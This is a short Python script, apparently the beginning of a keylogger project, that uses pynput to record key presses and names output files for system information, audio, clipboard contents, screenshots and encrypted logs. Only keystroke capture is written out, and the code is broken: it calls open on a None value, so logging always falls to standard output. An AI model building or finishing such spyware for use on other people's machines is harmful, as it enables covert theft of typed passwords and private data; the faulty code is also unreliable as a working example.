import sys
from pynput import keyboard

system_info = "system.txt"
audio_info = "audio.wav"
clipboard_info = "clipboard.txt"
screenshot_info = "screenshot.png"
keys_info = "key_log.txt"

system_information_e = 'e_system.txt'
clipboard_information_e = 'e_clipboard.txt'
keys_information_e = 'e_keys_logged.txt'

class MyListener:
    def __init__(self, outputLocation):
        self.outLocation = None
        try:
            self.outLocation.open(outputLocation, "wt")
        except:
            self.outLocation = sys.stdout

    def on_press(self, key):
        self.outLocation.write('key {0} pressed'.format(key))

    def close(self):
        try:
            self.outLocation.close()
        except Exception as e:
            print(e)

test = MyListener(keys_info)

inp = input('Please type:\n')

with keyboard.Listener(on_press=test.on_press, on_release=None) as listener:
    try:
        listener.join()
    except Exception as e:
        print('{0} exception happened...'.format(e.args[0]))
    finally:
        test.close()

